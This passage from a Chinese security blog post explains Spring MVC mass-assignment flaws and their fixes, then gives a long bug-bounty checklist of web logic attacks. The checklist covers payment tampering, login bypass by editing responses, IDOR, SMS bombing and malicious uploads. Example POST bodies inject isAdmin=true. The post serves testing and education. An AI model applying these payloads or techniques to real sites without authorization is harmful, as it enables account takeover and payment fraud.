+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/addUserInfo&quot;, method = RequestMethod.POST)</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">submit</span><span class="hljs-params">(User user)</span> &#123;<br>     userService.add(user);<br>     <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;successPage&quot;</span>;<br>  &#125;<br></code></pre></td></tr></table></figure>
+<p>针对上述代码，给出GPT回答</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">这段Java代码是一个简单的Spring MVC控制器方法，它处理HTTP POST请求并将用户信息保存到数据库中。让我们逐行来分析它：<br><br>1. `@RequestMapping(value = &quot;/addUserInfo&quot;, method = RequestMethod.POST)`: 这是一个Spring MVC注解，用于将HTTP请求映射到控制器方法。在这里，它将HTTP POST请求映射到&quot;/addUserInfo&quot;路径，表示该方法将处理该路径的POST请求。<br><br>2. `public String submit(User user) &#123;`: 这是控制器方法的声明，它接受一个名为&quot;User&quot;的参数。这里假设&quot;User&quot;是一个Java类，用于表示用户信息。<br><br>3. `userService.add(user);`: 在这一行，代码调用一个名为&quot;userService&quot;的服务（Service）类的&quot;add&quot;方法，并传入&quot;user&quot;作为参数。这表示将用户信息保存到数据库中，可能是由&quot;userService&quot;处理数据持久化的操作。<br><br>4. `return &quot;successPage&quot;;`: 最后，控制器方法返回一个字符串&quot;successPage&quot;。这通常用于将请求的处理结果返回给用户，告诉用户请求已成功处理。在这里，&quot;successPage&quot;可能是一个视图名称，它会被解析为一个实际的页面，展示给用户，用于确认操作已成功完成。<br><br>总结：这段代码是一个用于处理HTTP POST请求的Spring MVC控制器方法。它接受一个&quot;user&quot;对象作为参数，将用户信息保存到数据库中，并返回一个名为&quot;successPage&quot;的字符串，用于告知用户操作已成功完成。具体的用户信息保存逻辑和&quot;successPage&quot;页面的展示取决于代码中其他部分，例如&quot;userService&quot;类和视图解析器的配置。<br></code></pre></td></tr></table></figure>
+<p><strong>潜在危害</strong></p>
+<p>结合上面的demo，我们可以看到，controller层使用的自动绑定对象的方式，也就是使用了post请求的参数直接绑定到了User，虽然前端form表单中仅出现了username，phone，email，但是如果使用burp等工具向addUserInfo发送了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">POST /addUserInfo<br><br>username=daheike&amp;password=bypass&amp;email=test@test.com&amp;isAdmin=true<br></code></pre></td></tr></table></figure>
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">POST /addUserInfo<br><br>username=daheike&amp;password=bypass&amp;email=test@test.com&amp;userid=adminid<br></code></pre></td></tr></table></figure>
+<p>那么如果后续使用了被污染的对象的被污染的属性，那么就会产生一定的安全问题。</p>
+<p>自动绑定漏洞并非仅在Spring MVC中可能出现，只要有自动绑定功能的框架都可能出现这样的逻辑问题。</p>
+<p>但是可能对于大部分安全人员来说，可能面对的是一个黑盒的环境，很难发现controller层或者orm是否存在这样的问题，那么可能就需要多个表单的交叉对比，推测出可能出现问题的点了。</p>
+<p><strong>修复建议</strong></p>
+<p>通用修复方法是：避免将输入直接绑定到域对象，只有用户可以编辑的字段才包含在DTO中。以上文中的deom为例：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserRegistrationFormDTO</span> &#123;<br>     <span class="hljs-keyword">private</span> String username;<br>     <span class="hljs-keyword">private</span> String password;<br>     <span class="hljs-keyword">private</span> String email;<br><br>     <span class="hljs-comment">//Getters &amp; Setters</span><br>   &#125;<br></code></pre></td></tr></table></figure>
+<p>或者可以修改controller层，仅接收用户可以修改的参数：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/addUserInfo&quot;, method = RequestMethod.POST)</span><br>  <span class="hljs-keyword">public</span> String <span class="hljs-title function_">submit</span><span class="hljs-params">(String username,String phone,String email)</span> &#123;<br>     userService.add(username,phone,email);<br>     <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;successPage&quot;</span>;<br>  &#125;<br></code></pre></td></tr></table></figure>
+<p>也可以设置白名单：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span><br>  &#123;<br>     <span class="hljs-meta">@InitBinder</span><br>     <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initBinder</span><span class="hljs-params">(WebDataBinder binder, WebRequest request)</span><br>     &#123;<br>        binder.setDisallowedFields([<span class="hljs-string">&quot;isAdmin&quot;</span>]);<br>     &#125;<br><br>     ...<br>  &#125;<br></code></pre></td></tr></table></figure>
+<h3 id="3-0-SRC中的逻辑漏洞总结"><a href="#3-0-SRC中的逻辑漏洞总结" class="headerlink" title="3-0-SRC中的逻辑漏洞总结"></a>3.0 SRC中的逻辑漏洞总结</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">1. 注册：<br>    短信轰炸<br>    验证码安全问题<br>    密码爆破<br>    邮箱轰炸<br>2. 用户任意注册、批量注册<br>3. 用户名枚举<br>4. XSS（有框的地方就可以尝试插XSS）<br>5. 登录：<br>    短信轰炸、验证码安全问题、密码爆破、邮箱轰炸<br>    SQL注入<br>    撞库<br>    抓包把password字段修改为空值发送<br>    认证凭证替换、比如返回的数据包中包含账号，修改账号就能登录到其他账号<br>    Cookie仿冒<br>    修改返回包的相关数据，可能会登陆到其他的用户<br>6. 找回密码：<br>    短信邮箱轰炸、短信邮箱劫持<br>    重置任意用户账户密码、验证码手机用户未统一验证<br>    直接跳过验证步骤<br>7. 购买支付、充值（要利用抓包去仔细查看每一个可用的参数）<br>    交易金额、数量修改、更换支付模块（比如更换支付的模块金额）<br>    交易信息订单编码/导致信息泄露<br>    整数溢出，int最大值为2147483647，超过最大值<br>    修改充值账户<br>    支付绕过<br>8. 抽奖活动<br>	刷奖品、积分<br>	并发<br>9. 优惠卷、代金卷<br>	并发逻辑漏洞（burp批量获取优惠券）<br>	修改优惠券金额、数量<br>10. 订单信息<br>	订单信息遍历、泄露<br>	订单信息泄露导致用户信息泄露<br>	删出他人订单<br>11. 会员系统<br>    修改个人信息上传文件，上传带弹窗的html<br>    如遇上上传xlsx、docx，可能存在XXE，上传恶意的文档盲测<br>    图片上传也可能遇到imagereagick命令执行，上传恶意图片<br>    视频上传如果使用ffmpeg&lt;3.2.4（视频按帧分割成图片），上传恶意avi盲测ssrf<br>    用户横向越权访问、遍历、导致用户信息泄露<br>    SQL注入、个人简历处存储XSS个人信息注册的名称也可以插入XSS<br>12. 传输过程<br>	明文传输账户密码<br>	修改信息处无session/token导致csrf<br>	POST/COOKIE注入<br>13. 评论<br>	POST注入<br>	存储型XSS<br>    无session/token导致CSRF<br><br><br>1. 验证码问题<br>	万能验证码<br>	返回包中存在验证码<br>	删除验证码或者cookie中的值可以爆破账号密码<br>2. 	短信轰炸<br>    一直重放<br>    删除修改cookie，重放数据包<br>    遍历参数发送数据包<br>    手机号后面加空格或者前面加其他的比如+86或者逗号分号等，然后重发数据包<br>    请求参数修改大小写，或者添加请求参数比如&amp;id=1<br>    一个站的登录处可能做了防护，但是再找回密码处可能没有安全防护，或者在注册流程中没有安全防护，所以说多测试接口<br>    如果对手机号一天的次数进行了限制，还可以再发一次短信，DO intercept之后修改为成功回显<br>3. 水平越权<br>	主要登陆后还是修改参数，主要找到多个接口不断测试<br>	关注网页源代码，有时候会有表单，但被bidden（隐藏标签）给隐藏起来了，可以修改返回包然后尝试获取数据检测<br>	多个账号，主要分析请求参数<br>4. 数据泄露<br>	再找回密码处，填写数据后抓包查看返回信息，有可能存在敏感数据返回<br>5. 任意用户密码重置<br>	目前大部分都是在修改密码处参数修改<br>	有些是前端验证<br>	<br>	<br>支付逻辑漏洞<br>1. 边界值问题 : 正常的逻辑是用户购买商品，然后价格累加得到一个总价进行扣款。这个时候就会产生逻辑问题：如果说用户购买的商品是负数了，那么计算的总数就是负数。反过来钱给用户<br>2. 顺序执行缺陷：正常的逻辑是a-b-c-d 循环渐进的进行流程操作。这个时候就会产生逻辑问题：可以直接从中绕过某一个过程进入到下一步操作。如果说有一项是支付的操作，那么也就会产生支付绕过，如果说有一项是验证机制，就会绕过验证直接进入下一步。<br>3. 金额直接传输导致篡改：直接对下单的金额进行修改值，这里可以使用fd或者burp抓包<br>4. 确定支付之后还可以加入购物车：把商品放入购物车点击下单支付，会跳转到微信，支付宝等第三方支付平台。这个时候还可以继续在购物车中加入商品，支付结束之后，商家发放的商品是现在的购物车里面的东西。<br>5. 请求重放：购买成功之后，继续重放请求，可以让购买的商品一直增加。购买成功之后，会有一个银行对商户网站跳转的过程，如果反复进行操作，有几率会导致商品反复购买和增加，但是不需要付更多的钱。<br>6. 请求参数干扰：金钱做了签名认证之后，修改后不通过，但是在里面仍然会有一个参数对金额产生影响导致问题产生。<br>7. 订单替换：订单替换发生在支付之后的事件处理，同时向服务器发起二次支付请求一个多一个少，支付金额少的，然后支付之后进行替换，告知服务器订单支付完成，并且过程可以反复的回放。<br>8. 欺诈:需要两个收款人，一个是正常的商家，一个是伪造的商家<br>9. 单位替换：产生在paypal类似的国际支付的场景。<br>10. 用户替换：在支付过程中发生用户替换现象，首先登陆自己的账户，然后取得另外一个人的账户名等有效信息，在业务流程中用对方的用户名替换自己的用户名，用对方的余额购买完成后，再替换自己的账户名，这样就形成别人的钱买自己的东西<br>11. 强制攻击：强制攻击发生在暴力破解的情况下，如果一个商家运用一个自己的网店，接入第三方支付接口，由于设计上的不当导致商家与第三方支付约定的密钥Key可以单独被MD5加密，导致可以使用MD5碰撞技术对密钥进行破解，攻击者可以设计简单的密钥加密信息使得MD5加密是可以用MD5碰撞技术进行暴力破解。<br>12. 秘钥泄漏：内置支付功能的app为了设计上的方便有可能会把Md5或者是RSA的私钥泄漏导致攻击者反编译apk之后获取密钥信息使得交易信息可以被篡改。<br>13. 函数修改：apk反编译之后的函数修改，可能导致商家在最后一步向支付方提交订单时未验证信息的准确性，仍然被篡改。<br>14. heart bleed：SSL（安全套接层）协议是使用最为普遍网站加密技术，而OpenSSL则是开源的 SSL 套件，为全球成千上万的web服务器所使用。Web服务器正是通过它来将密钥发送给访客然后在双方的连接之间对信息进行加密。URL中使用 https打头的连接都采用了SSL加密技术。在线购物、网银等活动均采用SSL技术来防止窃密及避免中间人攻击。<br>该漏洞被归为缓冲过度读取。缓冲过度读取错误是软件可以读取比应该被允许还多的数据。漏洞让特定版本的openSSL成为无需钥匙即可开启的“废锁”，入侵者每次可以翻检户主的64K信息，只要有足够的耐心和时间，就可以翻检足够多的数据，拼凑出户主的银行密码、私信等敏感数据。产生原因：数据在传输的两端是不加密的。一些数据如果在传输过程中不加密则会泄露个人数据等信息。<br><br>1. 修改返回包的越权<br>修改手机号<br>一般的逻辑为：认证原手机号-&gt; 填写新手机号-&gt; 提交修改<br><br>如果在下一步操作时，没有校验上一步的认证是否成功时，就会存在逻辑缺陷绕过<br><br>比如在进行第一步认证原手机号时，随意输入验证码，将response包中的相关字段进行修改，比如0改成1，false改成true，即可绕过第一步验证，进入填写新手机号界面，如果第三步提交修改时没有验证第一步的结果，就会造成逻辑漏洞<br><br>2. 登录绕过<br>部分网站的身份验证放在了前端，因此只需要将response包中的相关字段进行修改，比如0改成1，false改成true，就可以登录任意用户账号<br><br>3. 水平越权<br>遍历ID<br>在一些请求中，GET和POST中有明显的ID数字参数（手机号、员工号、账单号、银行卡号、订单号等等），可以尝试进行遍历，如果程序没有对当前权限进行判断，就会存在水平越权问题<br><br>4. ID替换<br>如果程序对用户标识进行了hash或者加密，而无法破解用的什么方式的话，就无法通过遍历ID来获取其它用户的信息了，此时可以尝试注册两个账号，通过替换两个ID加密后的值，判断程序是否对权限进行了验证，如果没有，也会存在越权问题<br><br>5. 垂直越权<br>观察cookie中的session字段，可能某些字段或者参数代表身份，尝试修改  <br></code></pre></td></tr></table></figure>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/07/29/Log4j2%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">log4j2远程命令执行漏洞复现 Prev →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">浅析逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.1.</span> <span class="toc-text">1. 漏洞介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E6%88%90%E5%9B%A0"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.1 成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-%E5%88%86%E6%9E%90"><span class="toc-number">1.1.2.</span> <span class="toc-text">1.2 分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.2.</span> <span class="toc-text">2. 逻辑漏洞详解</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E5%B8%B8%E8%A7%81%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.1.</span> <span class="toc-text">2.1 常见的逻辑漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E5%A6%82%E4%BD%95%E6%8C%96%E6%8E%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.2.</span> <span class="toc-text">2.2 如何挖掘逻辑漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.3.</span> <span class="toc-text">2.3 身份验证漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">1. 暴力破解漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Session%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">2. Session固定攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98"><span class="toc-number">1.2.3.2.1.</span> <span class="toc-text">漏洞实战</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.3.2.2.</span> <span class="toc-text">复现过程</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Cookie%E6%AC%BA%E9%AA%97%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.3.3.</span> <span class="toc-text">3. Cookie欺骗漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9E%E6%88%98-2"><span class="toc-number">1.2.3.3.1.</span> <span class="toc-text">漏洞实战</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-4-%E6%9D%83%E9%99%90%E7%B1%BB%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.4.</span> <span class="toc-text">2.4 权限类逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%B9%B3%E8%A1%8C%E6%9D%83%E9%99%90%E8%B7%A8%E8%B6%8A"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">1. 平行权限跨越</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.2.4.1.1.</span> <span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.4.1.2.</span> <span class="toc-text">漏洞总结</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E5%9E%82%E7%9B%B4%E6%9D%83%E9%99%90%E8%B7%A8%E8%B6%8A"><span class="toc-number">1.2.4.2.</span> <span class="toc-text">2. 垂直权限跨越</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Couchdb-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83%EF%BC%88CVE-2017-12635%EF%BC%89"><span class="toc-number">1.2.4.2.1.</span> <span class="toc-text">Couchdb 垂直越权（CVE-2017-12635）</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%9C%AA%E7%BB%8F%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">1.2.4.3.</span> <span class="toc-text">3. 未经授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Docker-daemon-api%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.4.3.1.</span> <span class="toc-text">Docker daemon api未授权访问漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-5-%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.5.</span> <span class="toc-text">2.5 图形验证码漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%9B%BE%E5%BD%A2%E9%AA%8C%E8%AF%81%E7%A0%81%E7%AA%81%E7%A0%B4"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">1. 图形验证码突破</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#pikachu-on-server"><span class="toc-number">1.2.5.1.0.1.</span> <span class="toc-text">pikachu-on server</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#pikachu-on-client"><span class="toc-number">1.2.5.1.0.2.</span> <span class="toc-text">pikachu-on client</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-6-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.6.</span> <span class="toc-text">2.6 找回密码逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%AF%86%E7%A0%81%E6%89%BE%E5%9B%9E%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">1. 密码找回漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E-%E5%A2%A8%E8%80%85%E5%AD%A6%E9%99%A2"><span class="toc-number">1.2.6.1.0.1.</span> <span class="toc-text">登录密码重置漏洞-墨者学院</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-7-%E4%B8%9A%E5%8A%A1%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.7.</span> <span class="toc-text">2.7 业务数据篡改漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%B8%9A%E5%8A%A1%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9%EF%BC%88%E8%B5%8B%E5%80%BC%E5%8F%8D%E5%86%B2%EF%BC%89"><span class="toc-number">1.2.7.1.</span> <span class="toc-text">1. 业务数据篡改（赋值反冲）</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dami-cms-0%E5%85%83%E6%94%AF%E4%BB%98%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.7.1.1.</span> <span class="toc-text">dami__cms-0元支付漏洞</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-8-%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.8.</span> <span class="toc-text">2.8 执行顺序逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F%E7%AF%A1%E6%94%B9"><span class="toc-number">1.2.8.1.</span> <span class="toc-text">1. 执行顺序篡改</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-9-%E5%85%B6%E4%BB%96%E7%B1%BB%E5%9E%8B%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.9.</span> <span class="toc-text">2.9 其他类型逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.9.1.</span> <span class="toc-text">1. 条件竞争漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%95%B0%E6%8D%AE%E5%8C%85%E9%87%8D%E6%94%BE%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.9.2.</span> <span class="toc-text">2. 数据包重放漏洞</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%8F%82%E6%95%B0%E7%BB%91%E5%AE%9A%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.9.3.</span> <span class="toc-text">3. 参数绑定漏洞</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-0-SRC%E4%B8%AD%E7%9A%84%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93"><span class="toc-number">1.2.10.</span> <span class="toc-text">3.0 SRC中的逻辑漏洞总结</span></a></li></ol></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+window.waline = init;
+</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
+ waline({
+   el: '#waline',
+   dark: ':root[theme-mode="dark"]',
+   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
+   path: window.location.pathname,
+ });document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
